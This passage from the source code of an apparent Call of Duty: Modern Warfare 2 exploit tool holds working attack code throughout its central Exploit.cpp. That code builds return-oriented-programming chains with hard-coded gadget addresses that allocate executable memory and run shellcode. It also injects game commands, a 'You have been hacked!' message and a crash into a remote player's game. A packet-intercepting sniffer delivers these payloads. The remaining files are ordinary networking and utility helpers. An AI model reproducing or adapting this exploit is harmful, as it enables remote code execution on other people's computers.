			this->writeData(stack, UNUSED_DATA_POINTER, text);
			this->callFunction(stack, UNUSED_MEMORY_POINTER, Exploit::HudElementStub, 1, UNUSED_DATA_POINTER);
		}

		void Exploit::allocateMemory(std::vector<DWORD>* stack, DWORD address, DWORD size)
		{
			// Allocate executable memory
			stack->push_back(0x401000 + 0x00077a0a);    // pop esi
			stack->push_back(0x67D1E4);                 // IAT: VirtualAlloc

			stack->push_back(0x401000 + 0x0017f5c8);    // mov eax, [esi]; pop esi
			stack->push_back(0);                        // padding

			stack->push_back(0x401000 + 0x000ded54);    // jmp eax

			stack->push_back(0x401000 + 0x00077a0a);    // pop esi - for saving the memory pointer

			stack->push_back(0);                        // addr
			stack->push_back(size);                     // size
			stack->push_back(MEM_COMMIT | MEM_RESERVE); // addr
			stack->push_back(PAGE_EXECUTE_READWRITE);   // permissions

													    // Save memory pointer
			stack->push_back(address);                  // Target address
			stack->push_back(0x401000 + 0x00193450);    // mov [esi], eax
		}

		void Exploit::writeDataInEax(std::vector<DWORD>* stack, std::string data)
		{
			while (data.size() % 4) data.push_back(0);
			for (size_t i = 0; i < data.size(); i += 4)
			{
				stack->push_back(0x401000 + 0x000021a1);    // pop ecx
				stack->push_back(*PDWORD(data.data() + i)); // data
				stack->push_back(0x401000 + 0x00029059);    // mov [eax], ecx
				stack->push_back(0x401000 + 0x00254ab9);    // add eax, 3
				stack->push_back(0x401000 + 0x00064844);    // add eax, 1
			}
		}

		void Exploit::freeMemory(std::vector<DWORD>* stack, DWORD address)
		{
			stack->push_back(0x401000 + 0x00249982); // pop edx
			stack->push_back(address);

			stack->push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

			stack->push_back(0x401000 + 0x00249982); // pop edx
			stack->push_back(0x5B7880); // Z_VirtualFreeInternal

			stack->push_back(0x401000 + 0x00000039); // mov [esp + 4], eax; jmp edx

			this->pop(stack, 1);
			stack->push_back(0); // placeholder
		}

		void Exploit::writeFunction(std::vector<DWORD>* stack, DWORD address, void* function)
		{
			size_t length = 0;
			for (length = 0;; ++length)
			{
				DWORD val = *PDWORD(PBYTE(function) + length);
				if (val == 0x90909090 || val == 0xCCCCCCCC)
				{
					break;
				}
			}

			std::string data(LPSTR(function), length);
			this->allocateMemory(stack, address, data.size());
			this->writeDataInEax(stack, data);
		}

		void Exploit::callFunction(std::vector<DWORD>* stack, DWORD address, void* function, DWORD paramCount, ...)
		{
			if (function) this->writeFunction(stack, address, function);

			stack->push_back(0x401000 + 0x00249982); // pop edx
			stack->push_back(address);
			stack->push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

			stack->push_back(0x401000 + 0x000ded54); // jmp eax

			if (paramCount > 0)
			{
				this->pop(stack, paramCount);
				for (DWORD i = 0; i < paramCount; ++i)
				{
					stack->push_back((&paramCount)[i + 1]);
				}
			}

			if (function) this->freeMemory(stack, address);
		}

		void Exploit::pop(std::vector<DWORD>* stack, size_t params)
		{
			DWORD popOffsets[] =
			{
#ifdef USE_IW4X
				0x0000007d, // 0
				0x002aa192, // 1
				0x00136818, // 2
				0x000090fe, // 3
				0x00100f7e, // 4
				0x002c905c, // 5
				0x002c905b, // 6
#else
				0x000000a9, // 0
				0x00249982, // 1
				0x000236c2, // 2
				0x000b8d2c, // 3
				0x0009dfb2, // 4
				0x0000c9f2, // 5
				0x0026afab, // 6
#endif
			};

			if(params >= ARRAYSIZE(popOffsets)) throw std::runtime_error("Unsupported parameter count");
			stack->push_back(0x401000 + popOffsets[params]);
		}

		void Exploit::quit(std::vector<DWORD>* stack)
		{
			// ExitProcess
			stack->push_back(0x5C96BA);
		}

		void Exploit::restore(std::vector<DWORD>* stack)
		{
			stack->push_back(RESTORE_SERVER_CONTEXT);
		}

		void Exploit::writeData(std::vector<DWORD>* stack, DWORD address, std::string data)
		{
			data.push_back(0);
			while (data.size() % 4) data.push_back(0);

			stack->push_back(0x401000 + 0x00077a0a); // pop esi

			for (unsigned int i = 0; i < data.size(); i += 4)
			{
				stack->push_back(*(DWORD*)(data.data() + i));
				stack->push_back(0x401000 + 0x000421fe); // pop eax
				stack->push_back(address + i);
				stack->push_back(0x401000 + 0x00077a08); // mov [eax], esi; pop esi
			}

			stack->push_back(0);
		}

		void Exploit::spawnWorkerThread(std::vector<DWORD>* stack)
		{
#ifdef USE_IW4X
			stack;
#else
			this->writeFunction(stack, WORKER_POINTER_ADDR, Exploit::ExploitWorkerStub);
			this->callFunction(stack, UNUSED_MEMORY_POINTER, Exploit::ExploitWorkerCaller);
#endif
		}

		void Exploit::enableUfoMode(std::vector<DWORD>* stack)
		{
			this->callFunction(stack, UNUSED_MEMORY_POINTER, Exploit::EnableUfoModeStub);
		}

		void Exploit::enableSteamAuthExploit(std::vector<DWORD>* stack)
		{
			this->writeData(stack, UNUSED_DATA_POINTER, "VirtualProctect");
			this->callFunction(stack, UNUSED_MEMORY_POINTER, Exploit::EnableSteamAuthExploitStub);
		}

		std::string Exploit::buildPayload(int num)
		{
			std::vector<DWORD> stack;

#ifdef USE_IW4X
			num;
#else
			this->freeMemory(&stack, UNUSED_MEMORY_POINTER);

			if (num == -1)
			{
				//this->enableSteamAuthExploit(&stack);
				this->spawnWorkerThread(&stack);
			}
			else if (num == 0)
			{
				this->writeData(&stack, UNUSED_DATA_POINTER,
					"player_sprintSpeedScale 5\n"
					"player_sprintUnlimited 1\n");

				stack.push_back(0x563BA0); // Cbuf_AddText
				this->pop(&stack, 2);
				stack.push_back(0);
				stack.push_back(UNUSED_DATA_POINTER);
			}
			else if (num == 1)
			{
				this->writeData(&stack, UNUSED_DATA_POINTER,
					"player_sprintSpeedScale 1.5\n"
					"player_sprintUnlimited 0\n");

				stack.push_back(0x563BA0); // Cbuf_AddText
				this->pop(&stack, 2);
				stack.push_back(0);
				stack.push_back(UNUSED_DATA_POINTER);
			}
			else if (num == 2)
			{
				this->spawnHudElement(&stack, "You have been hacked!");
			}
			else if (num == 3)
			{
				this->writeData(&stack, UNUSED_DATA_POINTER,
					"scr_war_score_kill 2516000\n"
					"scr_war_score_suicide 2516000\n");

				stack.push_back(0x563BA0); // Cbuf_AddText
				this->pop(&stack, 2);
				stack.push_back(0);
				stack.push_back(UNUSED_DATA_POINTER);
			}
			else if (num == 4)
			{
				this->writeData(&stack, UNUSED_DATA_POINTER,
					"player_meleeRange 99999\n");

				stack.push_back(0x563BA0); // Cbuf_AddText
				this->pop(&stack, 2);
				stack.push_back(0);
				stack.push_back(UNUSED_DATA_POINTER);
			}
			else if (num == 5)
			{
				this->writeData(&stack, UNUSED_DATA_POINTER, "mp_rust");

				stack.push_back(0x5BE730);            // Dvar_SetStringByName
				this->pop(&stack, 2);
				stack.push_back(0x68F69C);            // 'ui_mapname'
				stack.push_back(UNUSED_DATA_POINTER); // mapname

				stack.push_back(0x563C50);            // Cbuf_AddCall
				this->pop(&stack, 2);
				stack.push_back(0);
				stack.push_back(0x59BCD0);            // UI_Map
			}
			else if (num == 6)
			{
				this->enableUfoMode(&stack);
			}
			else if (num == 7)
			{
				this->spawnHudElement(&stack, "jo ^\x01\x01\x01\x01\x01\x01\x01\x01\x01"); // Crash, invalid material pointer
			}

			this->restore(&stack);
#endif

			std::vector<DWORD> fixup;
			this->pop(&fixup, 1);
			fixup.push_back(ORG_PARAM); // old param? not really, but whatever

			const char safetyBytes = 8;
#ifdef USE_IW4X
			fixup.push_back(0x402500); // Com_Printf
			this->pop(&fixup, 3);
			fixup.push_back(0);
			fixup.push_back(0x72CCB0);
			fixup.push_back(0x6FC630);

			this->restore(&fixup);
#else
			static unsigned char shellcodeTemplate[] =
			{
				0x81, 0xEC, 0x70, 0x08, 0x00, 0x00, // sub esp, 870h
				0xC3                                // retn
			};

			std::string shellcode((char*)shellcodeTemplate, sizeof shellcodeTemplate);
			shellcode[2] -= safetyBytes;

			this->allocateMemory(&fixup, UNUSED_MEMORY_POINTER, shellcode.size());
			this->writeDataInEax(&fixup, shellcode);

			// Execute shellcode
			fixup.push_back(0x401000 + 0x00249982); // pop edx
			fixup.push_back(UNUSED_MEMORY_POINTER);
			fixup.push_back(0x401000 + 0x001ccb8c); // mov eax, [edx]

			fixup.push_back(0x401000 + 0x000ded54); // jmp eax
#endif

			std::string data;
			for (char i = 0; i < safetyBytes; ++i) data.push_back(0);

			data.append(LPSTR(stack.data()), stack.size() * 4);
			data.resize(0x800); // Exceed 0x800 bytes
			data.append(LPSTR(fixup.data()), fixup.size() * 4);

			if (stack.size() * 4 > (0x800 - safetyBytes)) throw std::runtime_error("Exceeded buffer size!");

			return data;
		}
	}
}

```

`Injector Features/Game/MW2/Exploit.hpp`:

```hpp
#pragma once

//#define USE_IW4X

namespace Game
{
	namespace MW2
	{
		class Client;

		class Exploit
		{
		public:
			std::string buildPayload(int num);

		private:
			void allocateMemory(std::vector<DWORD>* stack, DWORD address, DWORD size);
			void writeDataInEax(std::vector<DWORD>* stack, std::string data);
			void freeMemory(std::vector<DWORD>* stack, DWORD address);
			void writeData(std::vector<DWORD>* stack, DWORD address, std::string data);

			void writeFunction(std::vector<DWORD>* stack, DWORD address, void* function);
			void callFunction(std::vector<DWORD>* stack, DWORD address, void* function = nullptr, DWORD paramCount = 0, ...);

			void pop(std::vector<DWORD>* stack, size_t params);

			void quit(std::vector<DWORD>* stack);
			void restore(std::vector<DWORD>* stack);

			void spawnHudElement(std::vector<DWORD>* stack, std::string text);
			static void HudElementStub();

			void spawnWorkerThread(std::vector<DWORD>* stack);
			static void ExploitWorkerStub();
			static void ExploitWorkerCaller();

			void enableSteamAuthExploit(std::vector<DWORD>* stack);
			static void EnableSteamAuthExploitStub();

			void enableUfoMode(std::vector<DWORD>* stack);
			static void EnableUfoModeStub();
		};
	}
}

```

`Injector Features/Game/MW2/Handler.cpp`:

```cpp
#include "STDInclude.hpp"

#include "Network/Address.hpp"
#include "Network/Sniffer.hpp"

#include "Game/MW2/Handler.hpp"
#include "Game/MW2/Client.hpp"

namespace Game
{
	namespace MW2
	{
		Handler::Handler(Network::Sniffer* sniffer)
		{
			using namespace std::placeholders;
			sniffer->onPacket(std::bind(&Handler::handler, this, _1));
			printf("Listening for MW2 connections...\n");
		}
		
		Handler::~Handler()
		{

		}

		void Handler::handler(Network::Packet* packet)
		{
			if (packet->data.find("\xFF\xFF\xFF\xFF" "getchallenge") == 0
				&& packet->source.isLocal()) // If source is not local, then someone is connecting to us or the network config is fucked up!
			{
				std::lock_guard<std::mutex> _(this->mutex);
				this->client = std::make_shared<Client>(this, packet->target);
			}

			if (this->client)
			{
				int dir = this->client->getDirection(packet->source, packet->target);
				if (dir != Client::PacketDirection::NONE)
				{
					this->client->handle(packet, dir == Client::PacketDirection::REMOTE_TO_LOCAL);
				}
			}
		}

		void Handler::sendPayload(Network::Sniffer* sniffer, int num)
		{
			std::lock_guard<std::mutex> _(this->mutex);
			if(this->client) this->client->sendPayload(sniffer, num);
		}
	}
}

```

`Injector Features/Game/MW2/Handler.hpp`:

```hpp
#pragma once

namespace Game
{
	namespace MW2
	{
		class Client;

		class Handler
		{
		public:
			Handler(Network::Sniffer* sniffer);
			~Handler();

			void sendPayload(Network::Sniffer* sniffer, int num);

		private:
			std::mutex mutex;
			std::shared_ptr<Client> client;

			void handler(Network::Packet* packet);
		};
	}
}

```

`Injector Features/Network/Address.cpp`:

```cpp
#include "STDInclude.hpp"

#include "Network/Address.hpp"

namespace Network
{
	Address::Address()
	{
		ZeroMemory(&this->address, sizeof(this->address));
	}

	Address::Address(std::string addr) : Address()
	{
		this->parse(addr);
	}

	Address::Address(sockaddr_in* addr)
	{
		this->address = *addr;
	}

	bool Address::operator==(const Address &obj) const
	{
		return !std::memcmp(&this->address, &obj.address, sizeof(this->address));
	}

	void Address::setIPv4(in_addr addr)
	{
		this->address.sin_family = AF_INET;
		this->address.sin_addr = addr;
	}

	void Address::setPort(unsigned short port)
	{
		this->address.sin_port = htons(port);
	}

	unsigned short Address::getPort()
	{
		return ntohs(this->address.sin_port);
	}

	std::string Address::toString()
	{
		char buffer[MAX_PATH] = { 0 };
		inet_ntop(this->address.sin_family, &this->address.sin_addr, buffer, sizeof(buffer));

		return Utils::String::VA("%s:%hu", buffer, this->getPort());
	}

	bool Address::isLocal()
	{
		// According to: https://en.wikipedia.org/wiki/Private_network

		// 10.X.X.X
		if (this->address.sin_addr.S_un.S_un_b.s_b1 == 10) return true;

		// 192.168.X.X
		if (this->address.sin_addr.S_un.S_un_b.s_b1 == 192 && this->address.sin_addr.S_un.S_un_b.s_b2 == 168) return true;

		// 172.16.X.X - 172.31.X.X
		if (this->address.sin_addr.S_un.S_un_b.s_b1 == 172 && (this->address.sin_addr.S_un.S_un_b.s_b2 >= 16) && (this->address.sin_addr.S_un.S_un_b.s_b2 < 32)) return true;

		// 127.0.0.1
		if (this->address.sin_addr.S_un.S_addr == 0x0100007F) return true;

		// TODO: Maybe check for matching localIPs and subnet mask

		return false;
	}

	sockaddr* Address::getAddr()
	{
		return reinterpret_cast<sockaddr*>(this->getInAddr());
	}

	sockaddr_in* Address::getInAddr()
	{
		return &this->address;
	}

	void Address::parse(std::string addr)
	{
		auto pos = addr.find_last_of(":");
		if (pos != std::string::npos)
		{
			std::string port = addr.substr(pos + 1);
			this->setPort(USHORT(atoi(port.data())));

			addr = addr.substr(0, pos);
		}

		this->resolve(addr);
	}

	void Address::resolve(std::string hostname)
	{
		addrinfo *result = nullptr;
		if (!getaddrinfo(hostname.data(), nullptr, nullptr, &result))
		{
			unsigned short port = this->getPort();
			std::memcpy(&this->address, result->ai_addr, sizeof(this->address));
			this->setPort(port);

			freeaddrinfo(result);
		}
	}
}

```

`Injector Features/Network/Address.hpp`:

```hpp
#pragma once

namespace Network
{
	class Address
	{
	public:
		Address();
		Address(std::string addr);
		Address(sockaddr_in* addr);

		void setIPv4(in_addr addr);
		void setPort(unsigned short port);
		unsigned short getPort();

		sockaddr* getAddr();
		sockaddr_in* getInAddr();

		bool isLocal();

		std::string toString();

		bool operator!=(const Address &obj) const { return !(*this == obj); };
		bool operator==(const Address &obj) const;

	private:
		sockaddr_in address;

		void parse(std::string addr);
		void resolve(std::string hostname);
	};
}

```

`Injector Features/Network/Sniffer.cpp`:

```cpp
#include "STDInclude.hpp"

#include "Network/Address.hpp"
#include "Network/Sniffer.hpp"

namespace Network
{
	bool Sniffer::isRunning()
	{
		return !this->stopped;
	}

	void Sniffer::stop()
	{
		this->stopped = true;

		if (this->handle != INVALID_HANDLE_VALUE)
		{
			this->divert.invokePascal<BOOL>("WinDivertClose", this->handle);
			this->handle = INVALID_HANDLE_VALUE;
		}
	}

	void Sniffer::run()
	{
		Utils::Memory::Allocator allocator;

		u_int size = 0;
		const u_int maxSize = 0x10000;
		u_char* buffer = allocator.allocateArray<u_char>(maxSize);

		auto winDiverSend = this->divert.get<BOOL(__stdcall)(HANDLE, PVOID, UINT, PWINDIVERT_ADDRESS, UINT*)>("WinDivertSend");
		auto winDiverReceive = this->divert.get<BOOL(__stdcall)(HANDLE, PVOID, UINT, PWINDIVERT_ADDRESS, UINT*)>("WinDivertRecv");

		Packet packet;
		while (!this->stopped && this->handle != INVALID_HANDLE_VALUE)
		{
			if (winDiverReceive(this->handle, buffer, maxSize, &packet.address, &size) == TRUE)
			{
				PWINDIVERT_IPHDR ipHeader = PWINDIVERT_IPHDR(buffer);
				PWINDIVERT_UDPHDR udpHeader = PWINDIVERT_UDPHDR(buffer + (ipHeader->HdrLength * 4));

				packet.drop = false;
				packet.sniffer = this;
				packet.rawData = std::string_view(LPSTR(buffer), size);
				packet.data = std::string_view(LPSTR(udpHeader) + sizeof(WINDIVERT_UDPHDR), ntohs(udpHeader->Length) - sizeof(WINDIVERT_UDPHDR));

				if (udpHeader->Length <= sizeof(WINDIVERT_UDPHDR) || packet.data.size() > maxSize) packet.data = std::string_view(LPSTR(udpHeader), 0);

				IN_ADDR addr;
				addr.S_un.S_addr = ipHeader->SrcAddr;
				packet.source.setIPv4(addr);

				addr.S_un.S_addr = ipHeader->DstAddr;
				packet.target.setIPv4(addr);

				packet.source.setPort(ntohs(udpHeader->SrcPort));
				packet.target.setPort(ntohs(udpHeader->DstPort));

				if (this->callback) this->callback(&packet);
				if (!packet.drop) winDiverSend(this->handle, PVOID(packet.rawData.data()), UINT(packet.rawData.size()), &packet.address, &size);
			}
			else
			{
				std::this_thread::yield();
			}
		}
	}

	bool Sniffer::send(Network::Packet* packet)
	{
		this->divert.invokePascal<BOOL>("WinDivertHelperCalcChecksums", PVOID(packet->rawData.data()), UINT(packet->rawData.size()), 0ui64);

		u_int size = 0;
		BOOL result = this->divert.invokePascal<BOOL>("WinDivertSend", this->handle, PVOID(packet->rawData.data()), UINT(packet->rawData.size()), &packet->address, &size) == TRUE;
		return (result && size == packet->rawData.size());
	}

	void Sniffer::onPacket(Callback _callback)
	{
		this->callback = _callback;
	}

	void Sniffer::extractRessources()
	{
#ifndef _WIN64
		BOOL is64Bit = FALSE;
		IsWow64Process(GetCurrentProcess(), &is64Bit);

		if (is64Bit)
		{
#endif
			Utils::IO::File driver("WinDivert64.sys");
			driver.write(Utils::LoadResource(WINDIVERT_DRIVER_x64));
#ifndef _WIN64
		}
		else
		{
			Utils::IO::File driver("WinDivert32.sys");
			driver.write(Utils::LoadResource(WINDIVERT_DRIVER_x86));
		}
#endif

		Utils::IO::File library("WinDivert.dll");
		library.write(Utils::LoadResource(WINDIVERT_DLL));
	}

	Sniffer::Sniffer() : stopped(false), handle(INVALID_HANDLE_VALUE)
	{
		this->extractRessources();

		this->divert = Utils::NT::Module::Load("WinDivert.dll");
		if (this->divert.isValid())
		{
			this->handle = this->divert.invokePascal<HANDLE>("WinDivertOpen", "ip and udp", WINDIVERT_LAYER_NETWORK, -1000i16, 0ui64);
		}
	}

	Sniffer::~Sniffer()
	{
		this->stop();
	}
}

```

`Injector Features/Network/Sniffer.hpp`:

```hpp
#pragma once

#include <windivert.h>

namespace Network
{
	class Sniffer;

	class Packet
	{
	public:
		Sniffer* sniffer;
		WINDIVERT_ADDRESS address;

		Network::Address source;
		Network::Address target;

		std::string_view data;
		std::string_view rawData;
		std::string staticData;

		bool drop;
	};

	class Sniffer
	{
	public:
		typedef Utils::Slot<void(Network::Packet* packet)> Callback;

		Sniffer();
		~Sniffer();

		bool send(Network::Packet* packet);
		void onPacket(Callback callback);

		void run();
		void stop();
		bool isRunning();

	private:
		HANDLE handle;
		Callback callback;
		Utils::NT::Module divert;

		bool stopped;

		void extractRessources();
	};
}
```

`Injector Features/Resource.rc`:

```rc
// Microsoft Visual C++ generated resource script.
//
#pragma code_page(65001)

#include "STDInclude.hpp"

#define APSTUDIO_READONLY_SYMBOLS
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 2 resource.
//
#include "windows.h"

/////////////////////////////////////////////////////////////////////////////
#undef APSTUDIO_READONLY_SYMBOLS

/////////////////////////////////////////////////////////////////////////////
// English (United States) resources

#if !defined(AFX_RESOURCE_DLL) || defined(AFX_TARG_ENU)
LANGUAGE LANG_ENGLISH, SUBLANG_ENGLISH_US

#ifdef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// TEXTINCLUDE
//

1 TEXTINCLUDE 
BEGIN
    "#include ""windows.h""\r\n"
    "\0"
END

2 TEXTINCLUDE 
BEGIN
    "\r\n"
    "\0"
END

#endif    // APSTUDIO_INVOKED

/////////////////////////////////////////////////////////////////////////////
//
// Version
//

VS_VERSION_INFO VERSIONINFO
 FILEVERSION 1,0,0,0
 PRODUCTVERSION 1,0,0,0
 FILEFLAGSMASK 0x3fL
#ifdef _DEBUG
 FILEFLAGS 0x1L
#else
 FILEFLAGS 0x0L
#endif
 FILEOS 0x40004L
 FILETYPE VFT_DLL
 FILESUBTYPE 0x0L
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904b0"
        BEGIN
            VALUE "CompanyName", "momo5502"
            VALUE "FileDescription", "COD Exploit"
            VALUE "FileVersion", "1.0.0.0" 
            VALUE "InternalName", "cod-exploit"
            VALUE "LegalCopyright", "Copyright 2017 momo5502. All rights reserved."
            VALUE "OriginalFilename", "cod-exploit.exe"
            VALUE "ProductName", "cod-exploit"
            VALUE "ProductVersion", "1.0.0.0"
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x409, 1200
    END
END

/////////////////////////////////////////////////////////////////////////////
//
// Icon
//

IDI_ICON ICON "Icon.ico"

/////////////////////////////////////////////////////////////////////////////
//
// Binary Data
//

#ifndef _WIN64
WINDIVERT_DLL        RCDATA "..\\deps\\divert\\x86\\WinDivert.dll"
#else
WINDIVERT_DLL        RCDATA "..\\deps\\divert\\amd64\\WinDivert.dll"
#endif

WINDIVERT_DRIVER_x86 RCDATA "..\\deps\\divert\\x86\\WinDivert32.sys"
WINDIVERT_DRIVER_x64 RCDATA "..\\deps\\divert\\amd64\\WinDivert64.sys"

#endif    // English (United States) resources
/////////////////////////////////////////////////////////////////////////////



#ifndef APSTUDIO_INVOKED
/////////////////////////////////////////////////////////////////////////////
//
// Generated from the TEXTINCLUDE 3 resource.
//


/////////////////////////////////////////////////////////////////////////////
#endif    // not APSTUDIO_INVOKED


```

`Injector Features/STDInclude.cpp`:

```cpp
#include "STDInclude.hpp"

#pragma comment(linker,"\"/manifestdependency:type='win32' name='Microsoft.Windows.Common-Controls' version='6.0.0.0' processorArchitecture='*' publicKeyToken='6595b64144ccf1df' language='*'\"")

// For huffman
int oldsize = 0;
```

`Injector Features/STDInclude.hpp`:

```hpp
#pragma once

#define STD_INCLUDED

#ifndef RC_INVOKED

#define _HAS_CXX17 1
#define VC_EXTRALEAN
#ifndef NOMINMAX
#define NOMINMAX
#endif
#define WIN32_LEAN_AND_MEAN

// Requires Visual Leak Detector plugin: http://vld.codeplex.com/
#define VLD_FORCE_ENABLE
//#include <vld.h>

#include <windows.h>
#include <assert.h>
#include <intrin.h>
#include <Shellapi.h>
#include <winternl.h>
#include <VersionHelpers.h>
#include <conio.h>

#include <WinSock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma comment(lib, "ntdll.lib")

#pragma warning(push)
#pragma warning(disable: 4091)
#pragma warning(disable: 4244)
//#include <dbghelp.h>

#include <map>
#include <mutex>
#include <fstream>
#include <thread>
#include <unordered_map>
#include <queue>
#include <random>
#include <atomic>
#include <sstream>
#include <iostream>
#include <regex>

// Experimental C++17 features
#include <filesystem>
#include <optional>

#pragma warning(pop)

#define VA_DONT_USE_THREAD_STORAGE

// Enable additional literals
using namespace std::literals;

#include "Utils/IO.hpp"
#include "Utils/NT.hpp"
#include "Utils/Lock.hpp"
#include "Utils/Time.hpp"
#include "Utils/Queue.hpp"
#include "Utils/Utils.hpp"
#include "Utils/Memory.hpp"
#include "Utils/Signal.hpp"
#include "Utils/String.hpp"
#include "Utils/Network.hpp"
#include "Utils/InfoString.hpp"
#include "Utils/SignalHandler.hpp"

#endif

// Resource stuff
#ifdef APSTUDIO_INVOKED
#ifndef APSTUDIO_READONLY_SYMBOLS
// Defines below make accessing the resources from the code easier.
#define _APS_NEXT_RESOURCE_VALUE        102
#define _APS_NEXT_COMMAND_VALUE         40001
#define _APS_NEXT_CONTROL_VALUE         1001
#define _APS_NEXT_SYMED_VALUE           101
#endif
#endif

// Resources
#define IDI_ICON            102

#define WINDIVERT_DLL           300
#define WINDIVERT_DRIVER_x86    301
#define WINDIVERT_DRIVER_x64    302

```

`Injector Features/Utils/IO.cpp`:

```cpp
#include "STDInclude.hpp"

namespace Utils
{
	namespace IO
	{
		File::File(std::string file) : path(file) {}

		Result<uint64_t> File::size()
		{
			Result<uint64_t> result;
			result.result = false;

			std::ifstream stream(this->path);
			if (stream.good())
			{
				result.result = true;
				stream.seekg(0, std::ios::end);
				result.data = stream.tellg();
			}

			return result;
		}

		Result<std::string> File::read()
		{
			Result<std::string> result;
			result.result = false;

			std::ifstream stream(this->path, std::ios::binary);
			if (stream.is_open() && stream.good())
			{
				stream.seekg(0, std::ios::end);
				std::streamsize size = stream.tellg();
				stream.seekg(0, std::ios::beg);

				if (size > -1)
				{
					result.result = true;
					result.data.resize(static_cast<uint32_t>(size));
					stream.read(const_cast<char*>(result.data.data()), size);
					stream.close();
				}
			}

			return result;
		}

		bool File::write(std::string data, bool append)
		{
			this->createDir();

			std::ofstream stream(this->path, std::ios::binary | std::ofstream::out | (append ? std::ofstream::app : std::ofstream::out));
			if (!stream.is_open()) return false;

			stream.write(data.data(), data.size());
			stream.close();
			return true;
		}

		bool File::exists()
		{
			return std::ifstream(this->path).good();
		}

		bool File::remove()
		{
			return ::remove(this->path.data()) == 0;
		}

		bool File::createDir()
		{
			std::string dir = this->path;

			auto pos = dir.find_last_of("/\\");
			if (pos != std::string::npos)
			{
				dir = dir.substr(0, pos);

				return Directory(dir).create();
			}

			return true;
		}

		std::string File::getName(bool withExtension)
		{
			std::string _path = this->path;
			auto pos = _path.find_last_of("/\\");
			if (pos != std::string::npos) _path = _path.substr(pos + 1);

			if (!withExtension)
			{
				pos = _path.find_last_of(".");
				if (pos != std::string::npos) _path = _path.substr(0, pos);
			}

			return _path;
		}

		Directory::Directory(std::string dir) : path(dir) {}

		bool Directory::exists()
		{
			return std::experimental::filesystem::is_directory(this->path);
		}

		bool Directory::create()
		{
			return std::experimental::filesystem::create_directories(this->path);
		}

		bool Directory::empty()
		{
			return std::experimental::filesystem::is_empty(this->path);
		}

		Result<std::vector<std::string>> Directory::files()
		{
			Result<std::vector<std::string>> result;
			result.result = this->exists();

			if (result.result)
			{
				for (auto& file : std::experimental::filesystem::directory_iterator(this->path))
				{
					result.data.push_back(file.path().generic_string());
				}
			}

			return result;
		}
	}
}

```

`Injector Features/Utils/IO.hpp`:

```hpp
#pragma once

#ifndef STD_INCLUDED
#error "Missing standard header"
#endif

namespace Utils
{
	namespace IO
	{
		template<typename T>
		class Result
		{
		public:
			bool result;
			T data;
		};

		class File
		{
		public:
			File(std::string file);

			Result<uint64_t> size();
			Result<std::string> read();
			bool write(std::string data, bool append = false);
			bool exists();
			bool remove();

			std::string getName(bool withExtension = true);

		private:
			bool createDir();

			std::string path;
		};

		class Directory
		{
		public:
			Directory(std::string dir);

			bool exists();
			bool create();
			bool empty();
			Result<std::vector<std::string>> files();

		private:
			std::string path;
		};
	}
}

```

`Injector Features/Utils/InfoString.cpp`:

```cpp
#include "STDInclude.hpp"

namespace Utils
{
	void InfoString::set(std::string key, std::string value)
	{
		this->keyValuePairs[key] = value;
	}

	std::string InfoString::get(std::string key)
	{
		if (this->keyValuePairs.find(key) != this->keyValuePairs.end())
		{
			return this->keyValuePairs[key];
		}

		return "";
	}

	void InfoString::parse(std::string buffer)
	{
		if (buffer[0] == '\\')
		{
			buffer = buffer.substr(1);
		}

		std::vector<std::string> KeyValues = Utils::String::Explode(buffer, '\\');

		for (unsigned int i = 0; KeyValues.size() >= 2 && i < (KeyValues.size() - 1); i += 2)
		{
			this->keyValuePairs[KeyValues[i]] = KeyValues[i + 1];
		}
	}

	std::string InfoString::build()
	{
		std::string infoString;

		bool first = true;

		for (auto i = this->keyValuePairs.begin(); i != this->keyValuePairs.end(); ++i)
		{
			if (first) first = false;
			else infoString.append("\\");

			infoString.append(i->first); // Key
			infoString.append("\\");
			infoString.append(i->second); // Value
		}

		return infoString;
	}

	void InfoString::dump()
	{
		for (auto i = this->keyValuePairs.begin(); i != this->keyValuePairs.end(); ++i)
		{
			OutputDebugStringA(Utils::String::VA("%s: %s", i->first.data(), i->second.data()));
		}
	}
}

```

`Injector Features/Utils/InfoString.hpp`:

```hpp
#pragma once

namespace Utils
{
	class InfoString
	{
	public:
		InfoString() {};
		InfoString(std::string buffer) : InfoString() { this->parse(buffer); };
		InfoString(const InfoString &obj) : keyValuePairs(obj.keyValuePairs) {};

		void set(std::string key, std::string value);
		std::string get(std::string key);

		std::string build();

		void dump();

	private:
		std::map<std::string, std::string> keyValuePairs;
		void parse(std::string buffer);
	};
}

```

`Injector Features/Utils/Lock.cpp`:

```cpp
#include "STDInclude.hpp"

namespace Utils
{
	Lock::~Lock()
	{
		this->notifyAll();
		std::this_thread::yield();
	}

	void Lock::wait()
	{
		std::unique_lock<std::mutex> lock(this->mutex);
		this->notified = false;

		while (!this->notified)
		{
			this->conditionVar.wait(lock);
		}
	}

	void Lock::waitFor(std::chrono::nanoseconds nsecs)
	{
		std::unique_lock<std::mutex> lock(this->mutex);
		this->notified = false;

		auto start = std::chrono::high_resolution_clock::now();
		while (!this->notified && (start + nsecs) < std::chrono::high_resolution_clock::now())
		{
			this->conditionVar.wait_for(lock, nsecs - (std::chrono::high_resolution_clock::now() - start));
		}
	}

	void Lock::notifyOne()
	{
		std::this_thread::yield();
		std::lock_guard<std::mutex> _(this->mutex);

		this->notified = true;
		this->conditionVar.notify_one();
	}

	void Lock::notifyAll()
	{
		std::this_thread::yield();
		std::lock_guard<std::mutex> _(this->mutex);

		this->notified = true;
		this->conditionVar.notify_all();
	}
}

```

`Injector Features/Utils/Lock.hpp`:

```hpp
#pragma once

#ifndef STD_INCLUDED
#error "Missing standard header"
#endif

namespace Utils
{
	class Lock
	{
	public:
		~Lock();

		void wait();
		void waitFor(std::chrono::nanoseconds nsecs);

		void notifyOne();
		void notifyAll();

	private:
		std::mutex mutex;
		std::atomic<bool> notified;
		std::condition_variable conditionVar;
	};
}

```

`Injector Features/Utils/Memory.cpp`:

```cpp
#include "STDInclude.hpp"

namespace Utils
{
	Utils::Memory::Allocator Memory::MemAllocator;

	void* Memory::AllocateAlign(size_t length, size_t alignment)
	{
		void* data = _aligned_malloc(length, alignment);
		assert(data != nullptr);
		if (data) ZeroMemory(data, length);
		return data;
	}

